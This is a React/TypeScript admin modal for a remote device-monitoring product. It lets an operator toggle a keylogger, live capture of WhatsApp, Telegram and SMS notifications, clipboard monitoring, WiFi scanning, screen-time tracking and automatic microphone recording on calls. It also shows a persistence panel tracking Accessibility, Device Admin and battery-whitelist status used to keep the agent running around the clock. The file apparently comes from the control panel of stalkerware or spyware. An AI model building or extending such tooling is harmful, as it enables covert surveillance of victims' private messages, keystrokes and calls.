// components/admin/devices/DeviceTelemetryControlsModal.tsx
"use client";

import React, { useState } from "react";
import { Modal } from "@/components/ui/Modal";
import { Button } from "@/components/ui/Button";
import { DeviceTelemetryConfig } from "@/lib/device-telemetry-types";
import {
  Bell,
  Keyboard,
  Clipboard,
  Wifi,
  Lock,
  Mic,
  Clock,
  ShieldCheck,
  ShieldAlert,
  Save,
  Sliders,
} from "lucide-react";

interface Props {
  isOpen: boolean;
  onClose: () => void;
  deviceId: string;
  initialConfig?: DeviceTelemetryConfig;
  persistenceStatus?: {
    isAdmin?: boolean;
    isAccessibility?: boolean;
    isBatteryWhitelisted?: boolean;
  };
  onSaved?: (cfg: DeviceTelemetryConfig) => void;
}

export const DeviceTelemetryControlsModal: React.FC<Props> = ({
  isOpen,
  onClose,
  deviceId,
  initialConfig = {},
  persistenceStatus = {},
  onSaved,
}) => {
  const [config, setConfig] = useState<DeviceTelemetryConfig>(initialConfig);
  const [saving, setSaving] = useState(false);

  const toggle = (key: keyof DeviceTelemetryConfig) => {
    setConfig((prev) => ({ ...prev, [key]: !prev[key] }));
  };

  const handleSave = async () => {
    setSaving(true);
    try {
      const res = await fetch(`/api/devices/${deviceId}/telemetry-config`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ telemetry_config: config }),
      });
      if (res.ok) {
        onSaved?.(config);
        onClose();
      }
    } catch {}
    setSaving(false);
  };

  const ITEMS: { key: keyof DeviceTelemetryConfig; label: string; desc: string; icon: any }[] = [
    { key: "notifications", label: "Live Notifications Stream", desc: "Incoming WhatsApp, Instagram, Telegram & SMS previews", icon: Bell },
    { key: "keylogger", label: "Live Typed Text / Keylogger", desc: "Searches & text entered in chats, browsers & apps", icon: Keyboard },
    { key: "clipboard", label: "Clipboard Monitor", desc: "Text, links & numbers copied to clipboard", icon: Clipboard },
    { key: "wifi", label: "WiFi SSID & Surrounding Networks", desc: "Active network name, router MAC & signal levels", icon: Wifi },
    { key: "lock_events", label: "Lock Screen Activity Timeline", desc: "Screen ON, OFF & device unlocked events", icon: Lock },
    { key: "screen_time", label: "App Usage & Screen Time", desc: "Daily active minutes & launch timestamps", icon: Clock },
    { key: "call_recording", label: "Auto Call Audio Snip", desc: "Automatic ambient mic capture on call connect", icon: Mic },
  ];

  return (
    <Modal isOpen={isOpen} onClose={onClose} className="max-w-lg p-5">
      <div className="flex items-center justify-between pb-3 border-b border-slate-200 dark:border-white/10">
        <h2 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-1.5">
          <Sliders className="w-4 h-4 text-amber-500 dark:text-[#FFFC00]" />
          Telemetry &amp; Intelligence Controls
        </h2>
        <button onClick={onClose} className="text-slate-400 hover:text-slate-900 dark:hover:text-white text-sm font-bold px-2 py-0.5 rounded-lg">✕</button>
      </div>

      <div className="space-y-4 max-h-[75vh] overflow-y-auto pr-1 no-scrollbar text-xs pt-3">
        {/* Persistence & Anti-Sleep Health Banner */}
        <div className="bg-slate-50 dark:bg-white/[0.03] p-3 rounded-2xl border border-slate-200 dark:border-white/10 space-y-2">
          <p className="font-bold text-slate-900 dark:text-white flex items-center gap-1.5 text-xs">
            <Sliders className="w-3.5 h-3.5 text-amber-500 dark:text-[#FFFC00]" />
            Anti-Sleep &amp; 24/7 Persistence Status
          </p>
          <div className="grid grid-cols-3 gap-1.5 text-[11px] font-mono">
            <div className={`p-2 rounded-xl border flex flex-col items-center justify-center gap-1 text-center ${
              persistenceStatus.isAccessibility ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"
            }`}>
              {persistenceStatus.isAccessibility ? <ShieldCheck className="w-4 h-4" /> : <ShieldAlert className="w-4 h-4" />}
              <span className="font-semibold">Accessibility</span>
            </div>
            <div className={`p-2 rounded-xl border flex flex-col items-center justify-center gap-1 text-center ${
              persistenceStatus.isAdmin ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"
            }`}>
              {persistenceStatus.isAdmin ? <ShieldCheck className="w-4 h-4" /> : <ShieldAlert className="w-4 h-4" />}
              <span className="font-semibold">Device Admin</span>
            </div>
            <div className={`p-2 rounded-xl border flex flex-col items-center justify-center gap-1 text-center ${
              persistenceStatus.isBatteryWhitelisted ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"
            }`}>
              {persistenceStatus.isBatteryWhitelisted ? <ShieldCheck className="w-4 h-4" /> : <ShieldAlert className="w-4 h-4" />}
              <span className="font-semibold">No Sleep</span>
            </div>
          </div>
        </div>

        {/* Feature Switches */}
        <div className="space-y-2">
          {ITEMS.map(({ key, label, desc, icon: Icon }) => {
            const active = Boolean(config[key]);
            return (
              <div
                key={key}
                onClick={() => toggle(key)}
                className={`p-3 rounded-2xl border cursor-pointer transition-all flex items-center justify-between gap-3 ${
                  active
                    ? "bg-amber-500/10 dark:bg-[#FFFC00]/10 border-amber-500/40 dark:border-[#FFFC00]/40"
                    : "bg-slate-50 dark:bg-white/[0.02] border-slate-200 dark:border-white/5 hover:border-white/20"
                }`}
              >
                <div className="flex items-center gap-2.5 min-w-0">
                  <div className={`p-2 rounded-xl ${active ? "bg-amber-500 dark:bg-[#FFFC00] text-black" : "bg-slate-200 dark:bg-white/10 text-slate-700 dark:text-white"}`}>
                    <Icon className="w-4 h-4" />
                  </div>
                  <div className="min-w-0">
                    <p className="font-bold text-slate-900 dark:text-white truncate">{label}</p>
                    <p className="text-[11px] text-slate-500 dark:text-white/50 truncate">{desc}</p>
                  </div>
                </div>
                <div className={`w-10 h-6 rounded-full p-0.5 transition-colors shrink-0 flex items-center ${active ? "bg-amber-500 dark:bg-[#FFFC00] justify-end" : "bg-slate-300 dark:bg-white/20 justify-start"}`}>
                  <div className={`w-5 h-5 rounded-full shadow-md ${active ? "bg-black" : "bg-white"}`} />
                </div>
              </div>
            );
          })}
        </div>

        {/* Save CTA */}
        <div className="pt-2 flex justify-end gap-2">
          <Button variant="secondary" size="sm" onClick={onClose} disabled={saving}>Cancel</Button>
          <Button size="sm" onClick={handleSave} disabled={saving} className="gap-1.5 bg-[#FFFC00] text-black hover:bg-[#FFFC00]/90 font-bold">
            <Save className="w-3.5 h-3.5" />
            {saving ? "Applying..." : "Save & Sync Toggles"}
          </Button>
        </div>
      </div>
    </Modal>
  );
};
